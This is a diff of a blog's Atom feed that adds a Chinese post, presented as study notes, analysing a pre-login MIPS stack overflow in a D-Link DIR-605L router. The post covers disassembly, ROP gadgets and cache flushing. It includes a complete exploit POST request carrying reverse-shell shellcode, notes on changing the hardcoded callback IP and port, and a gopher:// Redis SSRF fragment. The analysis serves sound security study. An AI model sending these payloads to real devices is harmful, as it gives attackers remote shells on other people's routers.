@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://xdxd.love/"/>
-  <updated>2016-12-09T02:09:26.000Z</updated>
+  <updated>2016-12-13T01:09:23.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -14,6 +14,169 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一个mips栈溢出利用</title>
+    <link href="http://xdxd.love/2016/12/09/%E4%B8%80%E4%B8%AA%E8%B7%AF%E7%94%B1%E5%99%A8%E7%99%BB%E5%BD%95%E5%A4%84%E7%9A%84%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8/"/>
+    <id>http://xdxd.love/2016/12/09/一个路由器登录处的溢出分析和利用/</id>
+    <published>2016-12-09T01:58:59.000Z</published>
+    <updated>2016-12-13T01:09:23.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>翻译自<a href="http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/" target="_blank" rel="external">http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/</a>.这是D-link路由器一个未登录前的栈溢出利用.本文并非为原文的对照翻译,而是侧重记录在实践测试过程的问题和分析，算是一个读书笔记。</p>
+<a id="more"></a>
+<h1 id="静态分析">静态分析</h1><p>DIR-605L路由器存在一个登陆处的栈溢出.登录时候的表单中存在一个FILECODE的参数,这个参数是用来识别登录窗口显示的验证码图片.服务端获取这个参数之后存在了$s1寄存器中.</p>
+<pre><code><span class="keyword">la</span>      <span class="label">$t9</span>, websGetVar
+<span class="keyword">move</span>    <span class="label">$s7</span>, <span class="label">$v0</span>
+jalr    <span class="label">$t9</span> ; websGetVar
+addiu   <span class="label">$a1</span>, (aFilecode - 0x4A0000)  # “FILECODE"
+lw      <span class="label">$gp</span>, 0x290+var_280(<span class="label">$sp</span>)
+<span class="keyword">move</span>    <span class="label">$s1</span>, <span class="label">$v0</span>
+<span class="keyword">li</span>      <span class="label">$v0</span>, 1
+</code></pre><p>这里一个点就是MIPS的分支延迟,位于跳转后面的一条指令会在跳转之前执行.所以实际上执行的是</p>
+<pre><code>addiu   <span class="variable">$a1</span>, (aFilecode - <span class="number">0x4A0000</span>)  <span class="preprocessor"># <span class="string">"FILECODE"</span></span>
+jalr    <span class="variable">$t9</span> <span class="comment">; websGetVar</span>
+</code></pre><p>获得的FILECODE参数值存在$vo中,又存入$s1.</p>
+<p>然后获取的值作为getAuthCode函数的第二个参数，传递给getAuthCode.mips中函数调用参数通过$a0-$a3传递。超过4个的参数使用栈传递。</p>
+<pre><code>loc_455FF0:
+la      <span class="variable">$t9</span>, getAuthCode   <span class="comment"># load address </span>
+move    <span class="variable">$a1</span>, <span class="variable">$s1</span>   <span class="comment"># a1=s1 </span>
+jalr    <span class="variable">$t9</span> ; getAuthCode  <span class="comment"># run getAuthCode</span>
+move    <span class="variable">$a0</span>, <span class="variable">$s0</span> <span class="comment"># a0=s0</span>
+</code></pre><p>getAuthCode函数中将FILECODE又存到$s1寄存器，然后作为第三个参数传递给sprintf。</p>
+<pre><code><span class="keyword">li</span>      <span class="label">$gp</span>, 0x98AFC
+addu    <span class="label">$gp</span>, <span class="label">$t9</span>
+addiu   <span class="label">$sp</span>, -0xC0
+<span class="keyword">sw</span>      <span class="label">$ra</span>, 0xC0+var_8(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$s3</span>, 0xC0+var_C(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$s2</span>, 0xC0+var_10(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$s1</span>, 0xC0+var_14(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$s0</span>, 0xC0+var_18(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$gp</span>, 0xC0+var_B0(<span class="label">$sp</span>)
+<span class="keyword">la</span>      <span class="label">$t9</span>, memset
+addiu   <span class="label">$s2</span>, <span class="label">$sp</span>, 0xC0+var_A8
+<span class="keyword">move</span>    <span class="label">$s1</span>, <span class="label">$a1</span>   # s1=a1
+
+<span class="keyword">move</span>    <span class="label">$a0</span>, <span class="label">$s0</span>  # a0=s0
+<span class="keyword">move</span>    <span class="label">$a2</span>, <span class="label">$s1</span> #a2=s1
+<span class="keyword">la</span>      <span class="label">$a1</span>, aIg_smtp_email_  # <span class="string">"ig.smtp_email_addr"</span>
+<span class="keyword">la</span>      <span class="label">$t9</span>, sprintf
+nop
+jalr    <span class="label">$t9</span> ; sprintf
+addiu   <span class="label">$a1</span>, (aVarAuthS_msg - 0x4A0000)  # <span class="string">"/var/auth/%s.msg"</span>
+</code></pre><p>sprintf 函数一共接收了3个参数。</p>
+<p>sprintf()函数用于将格式化的数据写入字符串，其原型为：</p>
+<pre><code><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> * format [, argument, ...])</span></span>;
+</code></pre><p>用于将格式化的字符串写入第一个参数中。这里a0=s0.而s0在栈上的地位为：</p>
+<pre><code>jalr    <span class="variable">$t9</span> ; memset
+addiu   <span class="variable">$s0</span>, <span class="variable">$sp</span>, <span class="number">0xC0</span>+var_8<span class="number">0</span>
+lw      <span class="variable">$gp</span>, <span class="number">0xC0</span>+var_B<span class="number">0</span>(<span class="variable">$sp</span>)
+move    <span class="variable">$a0</span>, <span class="variable">$s0</span>
+move    <span class="variable">$a1</span>, <span class="variable">$zero</span>
+la      <span class="variable">$t9</span>, memset
+</code></pre><p>这是一个典型的栈缓冲区溢出，通过这个溢出可以覆盖存在栈上的寄存器内容和程序返回地址。偏移也比较容易计算。可以通过以下post请求进行验证。</p>
+<pre><code><span class="request">POST <span class="string">/goform/formLogin</span> HTTP/1.1</span>
+<span class="attribute">Host</span>: <span class="string">localhost</span>
+<span class="attribute">User-Agent</span>: <span class="string">Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span>
+<span class="attribute">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="attribute">Accept-Language</span>: <span class="string">en-US,en;q=0.5</span>
+<span class="attribute">Accept-Encoding</span>: <span class="string">gzip, deflate</span>
+<span class="attribute">Connection</span>: <span class="string">keep-alive</span>
+<span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded</span>
+<span class="attribute">Content-Length</span>: <span class="string">257</span>
+
+<span class="cpp">VERIFICATION_CODE=myvoiceismypassportverifyme&amp;FILECODE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD&amp;login_name=&amp;curTime=<span class="number">1348588030496</span>&amp;login_n=admin&amp;login_pass=Zm9vb255b3UA&amp;VER_CODE=</span>
+</code></pre><p>先用qemu启动boa程序。</p>
+<p><img src="/images/mipsstackexp1.png" alt=""></p>
+<p>程序触发段错误低位为44444444.<br><img src="/images/mipsstackexp2.png" alt=""></p>
+<p>返回地址和寄存器 s0-s3都可被覆盖。<br><img src="/images/mipsstackexp3.png" alt=""></p>
+<p>编写exploit之前需要注意几点。一是payload不能有NULL，而且不能有字符’g’.因为在payload进入getAuthCode之前有一个字符处理逻辑。</p>
+<p><img src="/images/mipsstackexp4.png" alt=""></p>
+<p>如果存在字符g，则在g后一个字节置0。sb $zero ,!($v0)</p>
+<p>mips的exp编写中还有一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：指令cache和数据cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。</p>
+<p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。</p>
+<p>比较好的方式利用ROP执行sleep(1)函数。使用ida mips rop插件在libc中搜索 li $a0,1</p>
+<pre><code>Python&gt;mipsrop.find(<span class="string">"li $a0,1"</span>)
+----------------------------------------------------------------------------------------------------------------
+|  Address     |  Action                                              |  Control Jump                          |
+----------------------------------------------------------------------------------------------------------------
+|  <span class="number">0x000248D4</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jalr  <span class="variable">$s1</span>                             |
+|  <span class="number">0x00011044</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jalr  <span class="variable">$v0</span>                             |
+|  <span class="number">0x0002B068</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
+|  <span class="number">0x0002B45C</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
+|  <span class="number">0x0002B5C8</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
+|  <span class="number">0x0002B864</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x30</span>+var_4(<span class="variable">$sp</span>)                 |
+|  <span class="number">0x0002BD00</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_8(<span class="variable">$sp</span>)                 |
+----------------------------------------------------------------------------------------------------------------
+Found <span class="number">7</span> matching gadgets
+</code></pre><p>0x248D4处代码。</p>
+<pre><code>li      <span class="variable">$a0</span>, <span class="number">1</span>
+move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
+jalr    <span class="variable">$t9</span> ; sub_244E<span class="number">0</span>
+ori     <span class="variable">$a1</span>, <span class="variable">$s0</span>, <span class="number">2</span>
+ori     <span class="variable">$a1</span>, <span class="variable">$s0</span>, <span class="number">2</span>
+move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
+jalr    <span class="variable">$t9</span> ; sub_244E<span class="number">0</span>
+li      <span class="variable">$a0</span>, <span class="number">2</span>
+</code></pre><p>将$a0设置为1，复制$s1的值到$t9,然后执行$t9的函数，而$s1使我们通过溢出可以控制的。非常适合做为rop的gadget。</p>
+<p>整个ROP的流程最基本的思路是，覆盖返回地址，返回地址指向栈上我们部署的shellcode地址。但是由于缓存的问题，需要先指向执行sleep，在指向shellcode的地址。</p>
+<p>devttys0中第一个gadget只是设置了a0的值，即设置了sleep函数的参数。下一个gadget是libc.so中的0x2B954.</p>
+<pre><code>LOAD<span class="value">:<span class="number">0002</span>B954                 move    <span class="variable">$t9</span>, <span class="variable">$s2</span>
+LOAD:<span class="number">0002</span>B958
+LOAD:<span class="number">0002</span>B958 loc_2B958:                               # CODE XREF: xdr_union+<span class="number">84</span>j
+LOAD:<span class="number">0002</span>B958                 lw      <span class="variable">$ra</span>, <span class="number">0</span>x30+<span class="function">var_4</span>(<span class="variable">$sp</span>)
+LOAD:<span class="number">0002</span>B95C                 lw      <span class="variable">$s4</span>, <span class="number">0</span>x30+<span class="function">var_8</span>(<span class="variable">$sp</span>)
+LOAD:<span class="number">0002</span>B960                 lw      <span class="variable">$s3</span>, <span class="number">0</span>x30+<span class="function">var_C</span>(<span class="variable">$sp</span>)
+LOAD:<span class="number">0002</span>B964                 lw      <span class="variable">$s2</span>, <span class="number">0</span>x30+<span class="function">var_10</span>(<span class="variable">$sp</span>)
+LOAD:<span class="number">0002</span>B968                 lw      <span class="variable">$s1</span>, <span class="number">0</span>x30+<span class="function">var_14</span>(<span class="variable">$sp</span>)
+LOAD:<span class="number">0002</span>B96C                 lw      <span class="variable">$s0</span>, <span class="number">0</span>x30+<span class="function">var_18</span>(<span class="variable">$sp</span>)
+LOAD:<span class="number">0002</span>B970                 jr      <span class="variable">$t9</span>
+LOAD:<span class="number">0002</span>B974                 addiu   <span class="variable">$sp</span>, <span class="number">0</span>x30</span>
+</code></pre><p>复制s2的值到t9，然后跳到t9执行。中间重新设置了ra和s1等寄存器的值。这里s2可以指向sleep函数，执行完sleep，就会跳到可控的ra执行。</p>
+<pre><code>LOAD:<span class="number">000027</span>E8                 move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
+LOAD:<span class="number">000027</span>EC                 jalr    <span class="variable">$t9</span> ; sub_22D<span class="number">0</span>
+LOAD:<span class="number">000027</span>F<span class="number">0</span>                 addiu   <span class="variable">$a2</span>, <span class="variable">$sp</span>, <span class="number">0x40</span>+var_24
+</code></pre><p>下一步是寻找一个栈上的偏移地址。apmib.so中偏移0x27E8的位置，将$sp+0x1c存入$a2,然后跳到$s1,如果把$s1指向apmib.so的0x1D78,这里把$a2复制到$t9，跳转到t9。这样，就可以跳转到一个相对于$sp偏移的地址。只需要把shellcode部署在$sp+0x1C就可以了。</p>
+<pre><code>LOAD:<span class="number">00001</span>D78                 move    <span class="variable">$t9</span>, <span class="variable">$a2</span>
+LOAD:<span class="number">00001</span>D7C                 jalr    <span class="variable">$t9</span> ; printf
+LOAD:<span class="number">00001</span>D8<span class="number">0</span>                 nop
+</code></pre><p>最后的请求为：</p>
+<pre><code><span class="request">POST <span class="string">/goform/formLogin</span> HTTP/1.1</span>
+<span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded</span>
+<span class="attribute">Content-Length</span>: <span class="string">894</span>
+
+<span class="mel">
+VERIFICATION_CODE=myvoiceismypassportverifyme&amp;FILECODE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="variable">%2A</span><span class="variable">%BB</span><span class="variable">%19T</span><span class="variable">%2A</span><span class="variable">%BA</span><span class="variable">%9D0AAAA</span><span class="variable">%2A</span><span class="variable">%BA</span><span class="variable">%A8</span><span class="variable">%D4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="variable">%2A</span><span class="variable">%AF</span><span class="variable">%0DxAAAAAAAAAAAA</span><span class="variable">%2A</span><span class="variable">%AF</span><span class="variable">%17</span><span class="variable">%E8AAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="variable">%24</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FA</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%21</span><span class="variable">%E4</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%21</span><span class="variable">%E5</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%28</span><span class="variable">%06</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%10W</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%AF</span><span class="variable">%A2</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%8F</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%FF4</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%AF</span><span class="variable">%AF</span><span class="variable">%FF</span><span class="variable">%E0</span><span class="variable">%3C</span><span class="variable">%0E</span><span class="variable">%1F</span><span class="variable">%905</span><span class="variable">%CE</span><span class="variable">%1F</span><span class="variable">%90</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%E4</span><span class="variable">%3C</span><span class="variable">%0E</span><span class="variable">%7F</span><span class="variable">%015</span><span class="variable">%CE</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%E6</span><span class="variable">%27</span><span class="variable">%A5</span><span class="variable">%FF</span><span class="variable">%E2</span><span class="variable">%24</span><span class="variable">%0C</span><span class="variable">%FF</span><span class="variable">%EF</span><span class="variable">%01</span><span class="variable">%800</span><span class="variable">%27</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%10J</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%24</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%8F</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%01</span><span class="variable">%E0</span><span class="variable">%28</span><span class="variable">%21</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%0F</span><span class="variable">%DF</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%24</span><span class="variable">%10</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%21</span><span class="variable">%EF</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%15</span><span class="variable">%F0</span><span class="variable">%FF</span><span class="variable">%FA</span><span class="variable">%28</span><span class="variable">%06</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%3C</span><span class="variable">%0F</span><span class="variable">%2F</span><span class="variable">%2F5</span><span class="variable">%EFbi</span><span class="variable">%AF</span><span class="variable">%AF</span><span class="variable">%FF</span><span class="variable">%EC</span><span class="variable">%3C</span><span class="variable">%0En</span><span class="variable">%2F5</span><span class="variable">%CEsh</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%F0</span><span class="variable">%AF</span><span class="variable">%A0</span><span class="variable">%FF</span><span class="variable">%F4</span><span class="variable">%27</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%EC</span><span class="variable">%AF</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%F8</span><span class="variable">%AF</span><span class="variable">%A0</span><span class="variable">%FF</span><span class="variable">%FC</span><span class="variable">%27</span><span class="variable">%A5</span><span class="variable">%FF</span><span class="variable">%F8</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%0F</span><span class="variable">%AB</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span>&amp;curTime=<span class="number">1348588030496</span>&amp;VER_CODE=<span class="number">1234</span>&amp;login_n=admin&amp;login_pass=Zm9vb255b3UA&amp;login_name=admin</span>
+</code></pre><p>使用文中提供的exp测试结果：</p>
+<p><a href="http://www.devttys0.com/wp-content/uploads/2012/10/dir605l_exploit.txt" target="_blank" rel="external">http://www.devttys0.com/wp-content/uploads/2012/10/dir605l_exploit.txt</a></p>
+<p><img src="/images/mipsstackexp5.png" alt=""></p>
+<p>poc中，反弹端口和ip写死了。测试起来不是很方便。可以手动修改如下位置：</p>
+<pre><code><span class="preprocessor"># port number</span>
+<span class="preprocessor"># <span class="number">0x1f90</span> = <span class="number">8080</span></span>
+<span class="preprocessor"># <span class="number">0x1ff5</span> =<span class="number">8181</span></span>
+<span class="string">"\x3c\x0e\x1f\xf5"</span>, <span class="preprocessor"># lui     t6,<span class="number">0x1f90</span></span>
+<span class="string">"\x35\xce\x1f\xf5"</span>, <span class="preprocessor"># ori     t6,t6,<span class="number">0x1f90</span></span>
+<span class="string">"\xaf\xae\xff\xe4"</span>, <span class="preprocessor"># sw     t6,-<span class="number">28</span>(sp)</span>
+
+<span class="preprocessor"># Big endian IP address <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span></span>
+<span class="preprocessor">#<span class="number">0xc0</span> = <span class="number">192</span></span>
+<span class="preprocessor">#<span class="number">0xA8</span> = <span class="number">168</span></span>
+<span class="preprocessor">#<span class="number">0x01</span> = <span class="number">1</span></span>
+<span class="preprocessor">#<span class="number">0x64</span> = <span class="number">100</span></span>
+<span class="preprocessor">#<span class="number">0x65</span> = <span class="number">101</span></span>
+<span class="string">"\x3c\x0e\xc0\xA8"</span>, <span class="preprocessor"># lui     t6,<span class="number">0x7f01</span></span>
+<span class="string">"\x35\xce\x01\x65"</span>, <span class="preprocessor"># ori     t6,t6,<span class="number">0x101</span></span>
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;翻译自&lt;a href=&quot;http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/&quot;&gt;http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/&lt;/a&gt;.这是D-link路由器一个未登录前的栈溢出利用.本文并非为原文的对照翻译,而是侧重记录在实践测试过程的问题和分析，算是一个读书笔记。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>一个mips栈溢出利用</title>
@@ -505,28 +668,6 @@ header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="v
     </summary>
     
       <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>一个路由器登录处的溢出分析和利用</title>
-    <link href="http://xdxd.love/2016/10/11/%E4%B8%80%E4%B8%AA%E8%B7%AF%E7%94%B1%E5%99%A8%E7%99%BB%E5%BD%95%E5%A4%84%E7%9A%84%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8/"/>
-    <id>http://xdxd.love/2016/10/11/一个路由器登录处的溢出分析和利用/</id>
-    <published>2016-10-11T06:32:51.000Z</published>
-    <updated>2016-11-03T05:43:06.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>test</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;漏洞poc&quot;&gt;漏洞poc&lt;/h2&gt;&lt;p&gt;test&lt;/p&gt;
-
-    
-    </summary>
-    
-      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
     
     
   </entry>
